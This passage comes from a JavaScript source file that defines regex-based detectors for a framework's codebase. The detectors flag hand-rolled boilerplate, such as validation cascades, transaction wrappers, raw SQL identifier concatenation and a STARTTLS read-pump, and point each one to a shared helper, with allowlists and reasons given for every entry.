    primitive: "validateOpts.optionalObjectWithMethod(value, method, label, ErrorClass, code?, description?)",
    // Match the literal duck-typed-handle shape: `if (opts.X !== undefined
    // && opts.X !== null) { if (typeof opts.X !== "object" || typeof
    // opts.X.method !== "function") throw }` — recurring across file-upload
    // (permissions.check), notify (queue.enqueue), seeders (db.prepare),
    // webhook (nonceStore.checkAndInsert).
    regex: /\w+\.\w+\s*!==\s*undefined\s*&&\s*\w+\.\w+\s*!==\s*null[\s\S]{0,200}?typeof\s+\w+\.\w+\s*!==\s*["']object["']\s*\|\|\s*typeof\s+\w+\.\w+\.\w+\s*!==\s*["']function["']/,
    allowlist: [
      "lib/validate-opts.js",
      // http-client.jar checks TWO methods (cookieHeaderFor + setFromResponse)
      // — the helper validates a single method, so refactoring would
      // silently drop one of the two checks.
      "lib/http-client.js",
      // mail.dkimSigner uses MailError(code, msg, permanent) — the
      // 3-arg constructor signature drops the permanent flag if routed
      // through validateOpts._throw which calls new errorClass(code, msg).
      "lib/mail.js",
    ],
    reason: "Extracted to validateOpts.optionalObjectWithMethod. Replaces the recurring `if (X !== undefined && X !== null) { if (typeof X !== 'object' || typeof X.method !== 'function') throw }` shape used to validate optional duck-typed handles. Allowlisted sites either check multiple methods or use a 3-arg error constructor that the helper would drop.",
  },
  {
    id: "inline-audit-emit-wrapper",
    primitive: "validateOpts.makeAuditEmitter(audit)",
    // Detect the literal `audit.safeEmit(Object.assign({ action: action },
    // info))` shape inside a try/catch — the boilerplate every primitive
    // previously rolled to wrap the operator-supplied audit handle.
    regex: /audit\.safeEmit\s*\(\s*Object\.assign\s*\(\s*\{\s*action\s*:\s*action\s*\}/,
    allowlist: ["lib/validate-opts.js"],
    reason: "Extracted to validateOpts.makeAuditEmitter — closure factory parallel to safeAsync.makeDropCallback. Replaces the per-file `function _emit(action, info) { if (!audit) return; try { ... } catch ... }` boilerplate.",
  },
  {
    id: "inline-default-resolution-cascade",
    primitive: "validateOpts.applyDefaults(opts, DEFAULTS)",
    // Detect the literal shape `(opts.X === undefined) ? DEFAULTS.X : opts.X`
    // — the cascade every primitive's create() previously ran 5–10 times
    // in a row to layer DEFAULTS over operator opts.
    regex: /\(\s*opts\.\w+\s*===\s*undefined\s*\)\s*\?\s*DEFAULTS\.\w+\s*:\s*opts\.\w+/,
    allowlist: [
      "lib/validate-opts.js",
      // testing.js's runMiddleware uses opts.timeoutMs but
      // DEFAULTS.runMiddlewareTimeoutMs — different key names, single
      // field. applyDefaults requires same-key on both sides; this site
      // legitimately keeps the inline ternary.
      "lib/testing.js",
    ],
    reason: "Extracted to validateOpts.applyDefaults — single helper that resolves opts against DEFAULTS in one call. Replaces 5–10 line cascades.",
  },
  {
    id: "inline-require-object-prelude",
    primitive: "validateOpts.requireObject(opts, label, ErrorClass)",
    regex: /if\s*\(\s*!opts\s*\|\|\s*typeof\s+opts\s*!==\s*["']object["']\s*\)\s*\{[\s\S]{0,200}?opts\s+must\s+be\s+an\s+object/,
    allowlist: [
      "lib/validate-opts.js",
      // The three call sites below pass `permanent: true` as the 3rd
      // arg to `_err(code, msg, permanent)`. validateOpts.requireObject
      // doesn't expose that arg — refactoring would silently drop the
      // permanence flag (which controls retry classification). Keep
      // these inline until requireObject grows opts.permanent or these
      // sites move to an alwaysPermanent error class.
      "lib/external-db.js",
      "lib/http-client.js",
      "lib/object-store/sigv4-bucket-ops.js",
    ],
    reason: "Extracted across api-key / cache / i18n / notify / permissions / seeders / webhook. Files with custom error codes or divergent messages (break-glass / config / deprecate / etc.) keep their bespoke shape — those preludes use module-namespaced codes that don't fit the generic helper.",
  },
  {
    id: "inline-onDrop-callback-wrapper",
    primitive: "safeAsync.safeInvoke(callback, payload, onError?)",
    // Detect the literal `onDrop({...})` call wrapped in try/catch — the
    // shape every log-stream sink previously rolled by hand.
    regex: /try\s*\{\s*onDrop\s*\(\s*\{(?:(?!onDrop\s*\(|\}\s*\)\s*;?\s*\}\s*catch)[\s\S]){0,2000}?\}\s*\)\s*;?\s*\}\s*catch/,
    allowlist: [],
    reason: "Extracted to safeAsync.safeInvoke — operator-supplied callbacks must invoke through the framework wrapper so throws can't cascade into the sink's flush loop.",
  },
  {
    id: "inline-object-store-http-request",
    primitive: "require('./http-request') (lib/object-store/http-request.js)",
    // Detect the literal `httpClient.request({ method, url, headers, body,
    // idleTimeoutMs, errorClass: ObjectStoreError, allowedProtocols })`
    // shape every protocol backend previously rolled by hand.
    regex: /errorClass\s*:\s*ObjectStoreError\s*,\s*allowedProtocols\s*:/,
    allowlist: ["lib/object-store/http-request.js"],
    reason: "Extracted across azure-blob / gcs / sigv4 / http-put. The shared helper threads the same five opts (idleTimeoutMs / maxResponseBytes / errorClass / allowedProtocols / allowInternal) through httpClient.request.",
  },
  {
    id: "inline-sql-transaction-wrapper",
    primitive: "dbSchema.runInTransaction(db, fn, opts?) — also dbSchema.runSqlOnHandle(db, sql)",
    // The literal BEGIN / COMMIT / ROLLBACK try/catch shape every
    // SQL-touching primitive previously rolled by hand. Match the
    // distinctive `_runSql ( ... , "BEGIN"` followed by COMMIT in the
    // same scope. Tokenized: `_ID ( _ID , _STR )` where _STR is "BEGIN".
    // Hard to match _STR contents post-tokenization; match the
    // surrounding shape instead: a `try { ... "BEGIN" ... "COMMIT" ...
    // } catch ... "ROLLBACK"` shape.
    regex: /"BEGIN"(?:(?!"BEGIN"|"ROLLBACK"|"COMMIT")[\s\S]){0,4000}?"COMMIT"(?:(?!"BEGIN"|"ROLLBACK")[\s\S]){0,1200}?\}\s*catch(?:(?!"BEGIN")[\s\S]){0,1200}?"ROLLBACK"/,
    allowlist: [
      "lib/db-schema.js",   // definition site (runInTransaction itself)
      // db.js's `transaction(fn)` is the framework's PUBLIC transaction
      // primitive — operates on the singleton `database` and is the
      // call shape operators use. It already routes through the
      // shared runSql; re-routing through runInTransaction would change
      // semantics (passing module.exports vs database). Keep as-is.
      "lib/db.js",
      // clusterStorage.transaction(fn) is the cluster-aware ASYNC
      // transaction primitive (v0.13.38). dbSchema.runInTransaction is
      // synchronous (BEGIN -> fn() -> COMMIT) and cannot wrap the async fn
      // the atomic-RMW callers (cache, dual-control) need. The cluster path
      // delegates to externalDb.transaction; the single-node path issues
      // BEGIN/COMMIT/ROLLBACK around an awaited fn with shared-connection
      // serialization (no other statement may interleave). Same legitimate-
      // primitive justification as db.js.
      "lib/cluster-storage.js",
    ],
    reason: "Extracted to dbSchema.runInTransaction. Replaces the inline BEGIN / COMMIT / ROLLBACK try/catch boilerplate in migrations / seeders / db-schema. Handles both raw better-sqlite3 and b.db framework wrapper handles via runSqlOnHandle. db.js + cluster-storage.js are allowlisted transaction primitives (sync public + async cluster-aware) that can't route through the sync helper.",
  },
  {
    id: "inline-numeric-bounds-cascade",
    primitive: "numericBounds.requirePositiveFiniteIntIfPresent / requireNonNegativeFiniteIntIfPresent",
    // Detect the literal `if (opts.X !== undefined) { if (!nb.isYFiniteInt(opts.X)) throw new XError(code, ... + nb.shape(opts.X)); }`
    // shape that every primitive's create() rolled by hand. Tokenized:
    // `! _ID . _ID ( _ID . _ID ) ) { throw new _ID ( _STR , _STR + _ID . _ID ( _ID . _ID )`
    // — the distinctive `+ nb.shape(opts.X)` tail fingerprints it.
    regex: /!\s*\w+\.is\w*FiniteInt\s*\(\s*\w+\.\w+\s*\)(?:(?!\n {2}\}|\.shape\s*\()[\s\S]){0,800}?\w+\.shape\s*\(\s*\w+\.\w+\s*\)/,
    allowlist: [
      "lib/numeric-bounds.js",   // definition site
      // The helper signature is `new errorClass(code, message)`. Sites
      // below use one of: factory call `_err(code, msg)`, raw
      // `new Error(...)`, 3rd-arg `permanent: true`, or a reversed
      // `(message, code)` constructor signature. Refactoring would
      // either drop semantics or flip a public error constructor.
      // Tracked as follow-ups in the agent's report.
      "lib/http-client-cookie-jar.js",
      "lib/mail-bounce.js",
      "lib/migrations.js",
      // The presign upload-policy minBytes cascade (`_err(code, msg, true)`
      // with the permanent flag + a domain message) was extracted from
      // gcs/sigv4 presignedUploadPolicy into this shared object-store helper.
      "lib/object-store/http-request.js",
      "lib/parsers/safe-env.js",
      "lib/parsers/safe-toml.js",
      "lib/parsers/safe-yaml.js",
      "lib/pqc-gate.js",
      "lib/queue-local.js",
      "lib/safe-buffer.js",
      "lib/safe-url.js",
    ],
    reason: "Extracted to numericBounds.requirePositiveFiniteIntIfPresent / requireNonNegativeFiniteIntIfPresent. Replaces the per-file `if (opts.X !== undefined) { if (!nb.isYFiniteInt(opts.X)) throw }` cascade with a single call.",
  },
  {
    id: "inline-log-via-or-fallback",
    primitive: "log.makeViaOrFallback(operatorLog, fallbackLog)",
    // Detect the literal `if (log && typeof log[level] === "function")
    // { try { log[level](message, fields); } catch ... } return; ...
    // fallback;` shape every log-routing primitive previously rolled
    // by hand. Tokenized: `if ( _ID && typeof _ID [ _ID ] === _STR ) {
    // try { _ID [ _ID ] ( _ID , _ID ) ; } catch`.
    regex: /if\s*\(\s*\w+\s*&&\s*typeof\s+\w+\s*\[\s*\w+\s*\]\s*===\s*["']function["']\s*\)\s*\{\s*try\s*\{\s*\w+\s*\[\s*\w+\s*\]\s*\(/,
    allowlist: [
      "lib/log.js",   // definition site of makeViaOrFallback
      // dev.js + pqc-gate.js — module-level _logVia(log, level, ...)
      // helpers that take log per-call. Refactoring would either
      // allocate a fresh closure per invocation (wasteful) or require
      // restructuring the file to thread log through closures.
      // Cluster broken (2 files < n=3 threshold); keep until a
      // refactor that consolidates them is justified.
      "lib/dev.js",
      "lib/pqc-gate.js",
    ],
    reason: "Extracted to log.makeViaOrFallback. Replaces the per-file `_logVia` boilerplate that bundler / error-page rolled by hand around an operator-supplied logger with a per-module fallback.",
  },
  {
    id: "inline-flush-timer-scheduler",
    primitive: "safeAsync.makeScheduledFlush(delayMs, flushFn)",
    // The literal `var flushTimer = null;` followed by setTimeout idempotent-schedule shape
    // every batched-write sink previously rolled by hand.
    regex: /var\s+flushTimer\s*=\s*null\s*;(?:(?!\n\}|if\s*\(\s*flushTimer)[\s\S]){0,1200}?if\s*\(\s*flushTimer/,
    allowlist: ["lib/safe-async.js"],
    reason: "Extracted to safeAsync.makeScheduledFlush — idempotent setTimeout coalesce-and-flush helper used by every log-stream sink.",
  },
  {
    id: "inline-emit-event-wrapper",
    primitive: "observability.safeEvent(name, value, labels) — already wraps event() in try/catch",
    // Detect any function that wraps observability.event in try/catch
    // instead of calling the framework helper. The shape is symmetric
    // across every consumer module that needs hot-path emission with
    // drop-silent semantics — extraction was complete, no allowlist.
    regex: /try\s*\{(?:(?!\}\s*catch|observability\.event)[\s\S]){0,800}?observability\.event\s*\([^)]*\)\s*;?\s*\}\s*catch/,
    allowlist: [],
    reason: "Extracted to observability.safeEvent — drop-silent semantics for hot-path event emission. Any module wrapping observability.event in try/catch should call observability.safeEvent instead.",
  },
  {
    id: "observability-emit-nonexistent-method",
    scanScope: "lib",
    primitive: "observability.safeEvent(name, value, labels) / observability.event(...) — there is no observability.emit",
    // The observability module exposes event / safeEvent / tap / setTap — it
    // has NO `emit`. A call to observability().emit(...) throws TypeError and,
    // because every call site wraps the emit in a drop-silent try/catch, the
    // metric silently never fires. The whole network-* family carried 11 such
    // dead calls. Any reintroduction is a dead telemetry emit, never a working
    // one — route through safeEvent(name, value, labels) instead.
    regex: /observability\s*\(\s*\)\s*\.\s*emit\s*\(/,
    allowlist: [],
    reason: "observability has no emit() method; observability().emit(...) is a dead drop-silent call. Use observability.safeEvent(name, value, labels).",
  },
  {
    id: "inline-hex-string-validator",
    primitive: "safeBuffer.isHex(s, expectedLength?) — returns boolean",
    regex: /\/\^\[0-9a-fA-F\]\+\$\/\s*\.\s*test\s*\(/,
    allowlist: ["lib/safe-buffer.js"],
    reason: "Hex-string validation is now safeBuffer.isHex / safeBuffer.HEX_RE. The lib/safe-buffer.js definition retains the literal regex.",
  },
  {
    id: "inline-crlf-string-test",
    primitive: "safeBuffer.hasCrlf(s) / safeBuffer.CRLF_RE",
    regex: /\/\[\\r\\n\]\/\s*\.\s*test\s*\(/,
    allowlist: ["lib/safe-buffer.js"],
    reason: "CRLF-injection guards now route through safeBuffer.hasCrlf / safeBuffer.CRLF_RE. The lib/safe-buffer.js definition retains the literal regex.",
  },
  {
    id: "inline-trailing-hspace-strip",
    primitive: "safeBuffer.stripTrailingHspace(s) / safeBuffer.TRAILING_HSPACE_RE",
    regex: /\.replace\s*\(\s*\/\[\s\\t\]\+\$\/\s*,/,
    allowlist: ["lib/safe-buffer.js"],
    reason: "Trailing horizontal-whitespace strip is now safeBuffer.stripTrailingHspace. The lib/safe-buffer.js definition keeps the literal regex.",
  },
  {
    id: "inline-iso8601-millisecond-strip",
    primitive: "time.toIso8601NoMs(date)",
    regex: /\.toISOString\s*\(\s*\)\s*\.\s*replace\s*\(\s*\/\\\.\\d\{3\}Z\$\//,
    allowlist: ["lib/time.js"],
    reason: "ISO-8601 millisecond stripping is now time.toIso8601NoMs(). The helper definition in lib/time.js keeps the inline form.",
  },
  {
    id: "inline-migration-filename-regex",
    primitive: "migrationFiles.MIGRATION_FILE_RE / migrationFiles.isMigrationFileName(name)",
    regex: /\/\^\\\?\(\\d\+\)-\(\[A-Za-z0-9_-\]\+\)\\\.js\$\//,
    allowlist: ["lib/migration-files.js"],
    reason: "Migration filename pattern is now migrationFiles.MIGRATION_FILE_RE. The migration-files module owns the literal.",
  },
  {
    id: "inline-sql-identifier-regex",
    primitive: "safeSql.DEFAULT_IDENTIFIER_RE / safeSql.MAX_IDENTIFIER_LENGTH",
    regex: /\/\^\[A-Za-z_\]\[A-Za-z0-9_\]\*\$\//,
    allowlist: ["lib/safe-sql.js"],
    reason: "SQL identifier validation is now safeSql.DEFAULT_IDENTIFIER_RE. The lib/safe-sql.js definition keeps the literal.",
  },
  {
    id: "raw-sql-identifier-interpolation",
    primitive: "safeSql.quoteIdentifier(name, dialect?) — runs validateIdentifier + emits the dialect-correct quoted form",
    // Match `<KEYWORD> " + <variable> +` shapes where:
    //   - the keyword is a known SQL DDL/DML position that takes an
    //     identifier next (FROM / INTO / UPDATE / TABLE / INDEX /
    //     TRIGGER / VIEW / JOIN — SELECT/INSERT are too column-heavy
    //     to flag cleanly, but they reach an identifier via FROM/INTO);
    //   - the next concatenated variable's name does NOT start with
    //     `q[A-Z_]` (the project's "quoted identifier" prefix
    //     convention, e.g. `qTable`, `q_Table`).
    // Hits raw `"CREATE TABLE " + tableName +` shapes where the table
    // is interpolated unquoted; the safeSql.quoteIdentifier helper
    // emits the dialect-correct `"tableName"` (sqlite/postgres) or
    // `` `tableName` `` (mysql) form and runs validateIdentifier
    // internally, so future SQL-keyword + raw identifier
    // concatenations are defense-in-depth covered too.
    //
    // Skips variables that signal already-quoted identifiers:
    //   - `q` followed by letter/digit/underscore (qTable, qt, q_Table)
    //   - `Q` followed by letter/digit/underscore (Q_TABLE, QTable)
    //   - `quoted...` (quotedTable, quotedColumn)
    regex: /\b(FROM|INTO|UPDATE|TABLE|INDEX|TRIGGER|VIEW|JOIN)\s+["']\s*\+\s*(?![qQ][A-Za-z0-9_]|quoted)\w+\s*\+/,
    allowlist: [
      "lib/safe-sql.js",   // the helper itself emits quote chars
      // lib/sql.js IS the b.sql query builder — the canonical composer
      // that assembles SQL from safeSql-quoted identifiers + bound
      // placeholders. Its CREATE TABLE / INDEX assembly interpolates a
      // resolved table reference (ref.ref(dialect), which validates +
      // quotes via the table() contract) after the keyword-string `ifNot`
      // ("IF NOT EXISTS "), which the keyword+next-token regex misreads as
      // a raw identifier. The builder is the thing every other module must
      // route through, so it's exempt like safe-sql.js itself.
      "lib/sql.js",
    ],
    reason: "Identifier ALWAYS reaches SQL through safeSql.quoteIdentifier(name, dialect). Validates shape + quotes for the dialect; a future shape-regex bypass can't reach raw concatenation. Local variables holding quoted identifiers use a `q`/`Q`/`quoted` prefix so the detector can skip them. lib/sql.js (the b.sql builder) is exempt — it is the composer that assembles SQL from safeSql-quoted parts, so the must-compose rule is satisfied by construction there.",
  },
  {
    id: "framework-table-sql-without-dialect",
    primitive: "thread the configured backend dialect into every framework-table b.sql call — { dialect: clusterStorage.dialect() }, the module's _sqlOpts() helper, or dbSchema.handleDialect/sqlOpts",
    skipCommentLines: true,
    // Inverse detector for the tri-dialect data layer. A framework table —
    // a "_blamejs_..." literal, a FOO_TABLE constant, or a _fooTable()
    // table-name helper — addressed through the b.sql builder MUST carry the
    // configured backend dialect. Omit it and the builder emits the sqlite
    // default, so the statement parses locally and in the test backend
    // (both sqlite) but breaks on a Postgres / MySQL deployment — a silent
    // dialect-default footgun. Every framework module threads the dialect:
    // inline `{ dialect: ... }`, a module-local `_sqlOpts()` returning
    // `{ dialect: clusterStorage.dialect() }`, or dbSchema.handleDialect /
    // dbSchema.sqlOpts. The regex marks the framework-table builder call;
    // the companion `requires` is satisfied by any threading marker anywhere
    // in the file.
    //
    // Anchors are framework-internal: a "_blamejs_" table literal, an
    // UPPER_SNAKE *_TABLE constant, or an underscore-prefixed _fooTable()
    // helper. Operator-supplied names (cli.js `safeTable` on the local
    // single-node b.db handle) are deliberately NOT matched.
    //
    // Per-FILE durability guard: a framework-table b.sql module that threads
    // NO dialect at all is the drift this catches. Per-CALL precision (one
    // missed dialect in a file that threads elsewhere) belongs to the
    // structural/primitive-aware detector tracked for a later cycle.
    regex: /\bsql(?:\(\))?\.(?:select|insert|insertMany|update|upsert|del|delete|create|createTable|alter|drop|truncate)\s*\(\s*(?:["']_blamejs_|[A-Z][A-Z0-9_]*_TABLE\b|_[a-z][A-Za-z0-9]*Table\s*\()/,
    requires: /dialect\s*:|sqlOpts\s*\(|handleDialect/,
    allowlist: [],
    reason: "v0.15.0 — the data layer is tri-dialect (sqlite / postgres / mysql). A framework-table b.sql call that omits the dialect emits the sqlite default and breaks on a Postgres/MySQL backend, silently, because the local default and the test backend are both sqlite. Every framework module threads it (inline `{ dialect: clusterStorage.dialect() }`, a `_sqlOpts()` helper, or dbSchema.handleDialect / dbSchema.sqlOpts); the requires-marker confirms the threading is present. Locks in the tri-dialect data layer so a newly-added framework table cannot silently default to sqlite.",
  },
  {
    id: "inline-optional-plain-object-validation",
    primitive: "validateOpts.optionalPlainObject(value, label, ErrorClass, code?, description?)",
    // Match the literal three-line cascade `if (X !== undefined && X !==
    // null) { if (typeof X !== "object" || Array.isArray(X)) throw ... }`
    // — the recurring "optional plain object (not array)" validator
    // shape shared by api-key (metadata), db-declare-view (hashColumns),
    // db-declare-row-policy, static.js (contentSafety).
    regex: /\w+\.\w+\s*!==\s*undefined\s*&&\s*\w+\.\w+\s*!==\s*null[\s\S]{0,200}?typeof\s+\w+\.\w+\s*!==\s*["']object["']\s*\|\|\s*Array\.isArray/,
    allowlist: [
      "lib/validate-opts.js",
      // external-db throws ExternalDbError with a 3rd `permanent: true`
      // arg that the validateOpts._throw factory signature doesn't carry
      // through. Routing through the helper would silently drop the
      // permanence flag (which controls retry classification).
      "lib/external-db.js",
      // protocol-dispatcher constructs the error inline with multi-line
      // formatted message details that don't fit the helper's
      // (label + description) shape.
      "lib/protocol-dispatcher.js",
      // problem-details throws ProblemDetailsError with the 3rd
      // `permanent: true` arg (same class as external-db above) — the
      // validateOpts._throw factory signature would silently drop it.
      "lib/problem-details.js",
    ],
    reason: "Extracted to validateOpts.optionalPlainObject. Replaces the recurring `if (X !== undefined && X !== null) { if (typeof X !== 'object' || Array.isArray(X)) throw }` shape used to validate optional plain-object opts. Three sites allowlisted: external-db + problem-details need the permanent-flag 3rd arg the helper drops; protocol-dispatcher uses multi-line formatted error messages that don't fit the helper's description slot.",
  },
  {
    id: "inline-redis-client-opts-forwarding",
    primitive: "redisClient.pickClientOpts(cfg, prefix?)",
    // Match the literal 9-key opts construction `{ url, password, username,
    // tls, ca, servername, connectTimeoutMs, commandTimeoutMs,
    // maxReconnectAttempts }` that cache-redis / pubsub-redis / queue-redis
    // / etc. previously each rolled by hand to forward to redisClient.create.
    // Detect via the distinctive triple `connectTimeoutMs ... commandTimeoutMs
    // ... maxReconnectAttempts` appearing within a small window (those three
    // keys uniquely identify a redis-client opts bag — no other framework
    // primitive uses all three together).
    regex: /connectTimeoutMs[\s\S]{0,300}?commandTimeoutMs[\s\S]{0,300}?maxReconnectAttempts/,
    allowlist: ["lib/redis-client.js"],
    reason: "Extracted to redisClient.pickClientOpts(cfg, prefix?) — single helper that returns the 9-key opts bag. cache-redis / pubsub-redis / queue-redis route through it. New redis-using primitives must call pickClientOpts; never hand-roll the 9-key forward.",
  },
  {
    id: "inline-buffer-byte-equality-loop",
    primitive: "Buffer.compare(a, b) === 0 (for non-crypto byte equality)",
    // Hand-rolled loop walking two buffers byte-by-byte and OR-ing into
    // a diff accumulator. Crypto-equality belongs in timingSafeEqual;
    // non-crypto equality belongs in Buffer.compare.
    regex: /for\s*\([^)]*\)\s*\{[\s\S]{0,150}?\|=\s*\w+\[\w+\]\s*\^\s*\w+\[\w+\]/,
    allowlist: [
      // timingSafeEqual implementation legitimately walks both buffers.
      "lib/safe-buffer.js",
      "lib/crypto.js",
    ],
    reason: "Non-crypto byte equality is Buffer.compare(a, b) === 0. ssrf-guard / address-equality call sites migrated. New code must use Buffer.compare or timingSafeEqual; never hand-roll the loop.",
  },
  {
    id: "audit-action-with-hyphen",
    primitive: "audit action `[a-z][a-z0-9_]*(\\.[a-z][a-z0-9_]*)+`",
    // Audit actions with a hyphen segment (e.g. "system.pubsub.publish-failed")
    // fail the action regex enforced by audit.record(); safeEmit catches the
    // throw and the event silently drops. The convention is dot-separated
    // identifiers with underscores, not hyphens. safeEmit normalizes today as
    // a safety net; new sites should follow the convention directly.
    regex: /\baction\s*:\s*["'][a-z][a-z0-9_]*(?:\.[a-z][a-z0-9_]*)+-/,
    allowlist: [
      // The detector itself defines the canonical pattern for documentation;
      // no production code needs to ship a hyphenated action.
    ],
    reason: "Audit action segments use underscores, not hyphens. The action regex in audit.record() rejects hyphens; safeEmit normalizes hyphens to underscores as a safety net but operators reading audit rows expect canonical underscore-form names. The detector requires at least one `.<segment>` before the hyphen to avoid false-positives on domain-level enum keys (e.g. sanitize-action: 'audit-only').",
  },
  {
    id: "non-canonical-audit-outcome",
    primitive: "outcome ∈ {success, failure, denied}",
    // Non-canonical outcomes (`ok` / `fail` / `warn` / `warning` / `duplicate` /
    // `skipped` / `error`) get normalized by safeEmit but reach record() as
    // strings the strict validator rejects. Use the canonical triple at the
    // call site so reviewers reading the code see the audit outcome directly.
    regex: /\boutcome\s*:\s*["'](?:ok|okay|fail|failed|err|error|warn|warning|duplicate|skip|skipped|pass|passed|succeeded|refused|deny)["']/,
    allowlist: [
      // safeEmit's normalizer table is the canonical source of the mapping.
      "lib/audit.js",
      // observability.js + permissions.js use observability-event outcomes
      // (deny / ok / fail) for metrics labels — separate vocabulary from the
      // audit-chain outcome triple. Detector cannot distinguish call shapes.
      "lib/observability.js",
      "lib/permissions.js",
      // dsr.js sourceResult.outcome is a per-source per-ticket outcome with
      // its own vocabulary (queried / erased / marked-restricted / failed /
      // skipped) — distinct from the audit-chain outcome triple.
      "lib/dsr.js",
    ],
    reason: "Audit outcomes are the literal strings 'success' / 'failure' / 'denied' at call sites. safeEmit normalizes the common typos as a safety net but the canonical form belongs in code so reviewers reading a primitive see exactly what audit row will land on the chain.",
  },
  {
    id: "inline-base64url-three-replace",
    primitive: "b.crypto.toBase64Url(buf) — routes through Node's built-in 'base64url' encoding (linear-time, no regex backtracking surface)",
    regex: /\.replace\(\s*\/=\+\$\/[gG]?\s*,/,
    allowlist: ["lib/crypto.js", "lib/argon2-builtin.js"],
    reason: "The `.replace(/=+$/, ...)` trailing-padding strip is polynomial-ReDoS-shaped per CodeQL js/polynomial-redos. The framework's `b.crypto.toBase64Url(buf)` helper routes through Node's built-in base64url encoding which is linear-time. lib/crypto.js carries the helper definition; lib/argon2-builtin.js retains a linear-loop `=`-strip (charCodeAt + slice) because PHC base64 uses standard alphabet `+/` not url-safe `-_` — toBase64Url's output would be the wrong shape for PHC strings.",
  },
  {
    id: "mountinfo-options-bind-check",
    primitive: "parse /proc/self/mountinfo field 4 (root within source FS) and check != \"/\" for bind detection",
    regex: /mountinfo(?:(?!\n\})[\s\S]){0,6000}?\boptions\b(?:(?!\n\})[\s\S]){0,400}?indexOf\(["']bind["']\)/,
    allowlist: [],
    reason: "Per Documentation/filesystems/proc.rst §3.5, /proc/self/mountinfo field 6 (mount options) does NOT carry a 'bind' tag — the kernel exposes bind-mount provenance via field 4 ('root within source filesystem'), which is '/' for a regular mount and the bound source path for a bind mount. Checking the options field for 'bind' never fires for actual bind mounts and silently misses the failure mode it claims to defend. Detector catches the mis-parse shape at n=1.",
  },
  {
    id: "starttls-tlssocket-construct-direct",
    primitive: "b.mail.server.tls.upgradeSocket({ plainSocket, secureContext, onSecure, onData, onError })",
    // CVE-2021-33515 / CVE-2021-38371 class: direct `new nodeTls.TLSSocket(<socket>` construction in a
    // mail-server listener bypasses the shared upgrade helper. The helper strips the plain-socket "data"
    // listener (smuggling defense), pauses, and wires the new TLSSocket. New mail-server-* listeners that
    // construct TLSSocket directly trip this detector at n=1.
    regex: /new\s+nodeTls\.TLSSocket\s*\(\s*socket\b/,
    allowlist: [
      // upgradeSocket helper itself constructs the TLSSocket; listener removal happens INSIDE it.
      "lib/mail-server-tls.js",
    ],
    reason: "STARTTLS / STLS upgrade across MX / submission / IMAP / POP3 listeners. CVE-2021-33515 (Dovecot) + CVE-2021-38371 (Exim) — plaintext bytes pipelined ahead of the handshake reach the post-TLS dispatcher when the plain socket's 'data' listener is not stripped before TLSSocket wraps. Centralized in mail-server-tls.upgradeSocket which removes the listener + pauses the socket + wraps + re-arms idle timeout + wires onSecure / onData / onError. New listeners route through the helper.",
  },
  {
    // STARTTLS completion read-pump — extracted to upgradeLineProtocol.
    // The line-buffered store listeners (IMAP/POP3/ManageSieve) each
    // inlined a byte-identical post-handshake onData read-pump inside
    // their upgradeSocket({...}) call: `onData: function (tlsSocket,
    // chunk) { state.lineBuffer = Buffer.concat([state.lineBuffer,
    // chunk]); _drainBuffer(state, tlsSocket); }`. imap+pop3 shared an
    // 8-line byte-identical block through this callback; the whole 3
    // formed the fp:962317254477 STRONG-DUP. Consolidated into
    // mailServerTls.upgradeLineProtocol, which owns the pre-handshake
    // state-drain (lineBuffer always reset — the CVE-2021-33515 /
    // CVE-2021-38371 injection invariant), the state.tls=true base,
    // and the read-pump; the per-protocol bits (clearFields, drain,
    // onSecure-extra, onError, onTimeout) pass as data/callbacks. The
    // 2-param `onData:` key + read-pump body anchor distinguishes this
    // STARTTLS ingest from the plaintext `socket.on("data", function
    // (chunk) {...}` handler (1 param), and from the transfer
    // listeners' serialized feed (mx `_feedChunk` / submission
    // `_ingestBytes`) which do NOT line-buffer.
    id: "starttls-readpump-hand-rolled",
    primitive: "b.mail.server.tls.upgradeLineProtocol({ state, socket, secureContext, idleTimeoutMs, clearFields, drain, onSecure?, onError, onTimeout? }) — owns the pre-handshake state-drain + state.tls base + line read-pump; route the line-buffered store-protocol STARTTLS completion through it instead of inlining the read-pump in an upgradeSocket call",
    regex: /onData:\s*function\s*\(\s*tlsSocket,\s*chunk\s*\)\s*\{\s*state\.lineBuffer\s*=\s*Buffer\.concat\(\s*\[\s*state\.lineBuffer,\s*chunk\s*\]\s*\)/,
    allowlist: [
      // upgradeLineProtocol IS the read-pump's home (it calls upgradeSocket with this onData).
      "lib/mail-server-tls.js",
    ],
    reason: "IMAP/POP3/ManageSieve store listeners each inlined the byte-identical post-STARTTLS onData read-pump (`state.lineBuffer = Buffer.concat([state.lineBuffer, chunk]); _drainBuffer(state, tlsSocket)`) inside their upgradeSocket({...}) call, with imap+pop3 sharing an 8-line byte-identical block (the upgradeSocket call through onData) — the fp:962317254477 STRONG-DUP. The upgradeSocket primitive already owns the TLS mechanics (listener-strip/pause/wrap/idle-rearm); what stayed duplicated was the protocol-level completion: drop the pre-handshake lineBuffer (the CVE-2021-33515/CVE-2021-38371 injection invariant), set state.tls, append+drain. Extracted to mailServerTls.upgradeLineProtocol — it centralizes the lineBuffer reset (impossible to forget) + state.tls + the read-pump; each caller passes clearFields (its half-parsed command/literal/auth fields), drain, onError, onTimeout, and an optional onSecure (ManageSieve re-emits its RFC 5804 capability banner). Byte-parity proven per caller. The transfer listeners (MX/submission) ingest via a serialized feed pump on a closure-local buffer, not state.lineBuffer, so they call upgradeSocket directly and are not matched (their onData runs _feedChunk/_ingestBytes). This n=1 inverse detector (anchored on the 2-param onData key + read-pump body, which the 1-param plaintext socket.on('data') handler does not match) refuses a re-inlined STARTTLS read-pump outside lib/mail-server-tls.js (the upgradeLineProtocol home).",
  },
  {
    id: "sbom-toplevel-ref-by-slash-heuristic",
    primitive: "Derive top-level SBOM refs by exclusion from _childRefs, not by substring on '/' in the bom-ref",
    // Scoped npm package names like `@peculiar/x509` contain a `/`
    // in their bom-ref, so a heuristic that filters bom-refs on
    // indexOf("/") === -1 (with or without an `^@` escape hatch)
    // misclassifies the next scoped sub-component naming scheme to
    // arrive. The correct derivation is exclusion from _childRefs
    // (anything that doesn't appear as a child in _subDeps is a
    // top-level ref).
    regex: /\.filter\s*\(\s*function\s*\([^)]*\)\s*\{\s*return\s+c\["bom-ref"\]\.indexOf\("\/"\)/,
    allowlist: [],
    reason: "Top-level SBOM bom-refs should be derived by exclusion from _childRefs (any ref not appearing as a child in _subDeps is top-level). The substring heuristic on '/' breaks for scoped npm packages and any future namespacing scheme.",
  },
  {
    id: "sbom-subcomponent-version-inherits-parent",
    primitive: "Sub-component SBOM entries must use their own upstream version, not entry.version",
    // For a meta-bundle whose parent version is a composite tag like
    // `2.0.0+pkijs-3.4.0`, forcing every child component to inherit
